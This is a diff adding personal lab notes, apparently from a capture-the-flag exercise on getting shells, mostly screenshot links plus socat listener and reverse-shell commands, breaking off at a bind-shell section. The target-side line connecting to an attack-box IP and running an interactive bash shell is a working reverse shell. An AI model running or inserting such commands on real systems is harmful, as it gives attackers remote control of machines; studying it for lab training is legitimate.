@@ -852,8 +852,69 @@ once account created (if the service is enabled/exposed)
 
 - now we set up netcat listener and upload and activate the shell on the Linux machine - command given in first question
 
-
+<img width="287" height="29" alt="image" src="https://github.com/user-attachments/assets/cdf57d5f-7612-41ee-8392-781ce13542fb" />
 
 - upload file (http://linuxip)
 
 - <img width="435" height="323" alt="image" src="https://github.com/user-attachments/assets/fe346554-0d4a-4c7c-ae5d-22883a833b95" />
+
+- <img width="435" height="323" alt="image" src="https://github.com/user-attachments/assets/3e73cbce-8fd0-4a48-9b0e-ebf082fd7c80" />
+
+- connection received
+
+<img width="478" height="133" alt="image" src="https://github.com/user-attachments/assets/251874ff-c2b0-4116-adfd-ce60c6f9b33b" />
+
+
+
+
+
+- <img width="483" height="262" alt="image" src="https://github.com/user-attachments/assets/10ae52f1-c86b-4c39-9ccc-3c39bbbc2250" />
+
+<img width="350" height="120" alt="image" src="https://github.com/user-attachments/assets/09e30165-1dec-487f-bfc4-eb81666506c1" />
+
+<img width="468" height="325" alt="image" src="https://github.com/user-attachments/assets/b7f86e52-b1c2-4ebb-9c6f-3960a851678f" />
+
+---
+
+<img width="427" height="101" alt="image" src="https://github.com/user-attachments/assets/a6c3ca87-2f4c-44aa-8094-218ba2b7a782" />
+
+<img width="472" height="432" alt="image" src="https://github.com/user-attachments/assets/fea957ad-a84e-4ebd-9beb-c78654ae1bdd" />
+
+
+<img width="476" height="454" alt="image" src="https://github.com/user-attachments/assets/ef953071-3ba1-47ea-949e-084abb21b60b" />
+
+- above is a successful piped shell
+
+<img width="409" height="111" alt="image" src="https://github.com/user-attachments/assets/b4bb439c-8dd2-4324-a146-3569a4854040" />
+
+<img width="245" height="328" alt="image" src="https://github.com/user-attachments/assets/e37b467e-421b-436a-aad8-015f33f6c343" />
+
+so we have made a reverse web shell using pipe method
+
+---
+
+- <img width="431" height="52" alt="image" src="https://github.com/user-attachments/assets/3acb63cf-855e-414f-9e7e-261f2e884efa" />
+
+**reverse**
+
+<img width="479" height="269" alt="image" src="https://github.com/user-attachments/assets/76c65a7c-226f-40a2-82bf-727d5340dd45" />
+
+- on attack box (listener)
+
+   socat -d -d TCP-LISTEN:4444,reuseaddr,fork -
+
+- -d -d → debug output
+- TCP-LISTEN:4444 → listen on port 4444
+- reuseaddr → allows quick restarts
+- fork → handle multiple connections
+
+- on target
+
+  socat TCP:10.10.84.61:4444 EXEC:"bash -li"
+
+- Target connects to Attackbox IP and port 4444
+- Executes an interactive bash shell
+
+**bind**
+
+- Sometimes targets cannot connect out (reverse shell fails). You can bind on high, uncommon port, or use STDIO/PTY trick:
